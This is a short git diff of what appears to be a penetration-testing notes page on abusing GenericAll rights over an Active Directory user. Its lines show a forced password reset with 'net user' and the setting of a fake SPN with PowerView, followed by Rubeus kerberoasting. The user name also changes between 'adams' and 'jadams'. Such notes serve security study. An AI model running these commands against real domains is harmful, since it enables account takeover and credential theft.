@@ -19,8 +19,10 @@ GenericAll Privilege on adams user. 3-Ways.
 ```markdown
 net user adams N3wPassw0rd! /domain
 ```
-Import [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
 2. We can set adams user SPN and do [Kerberoasting](https://k4sth4.github.io/Kerberos/).
+
+Import [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 ```markdown
 Set-DomainObject -Identity adams -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:jadams /nowrap
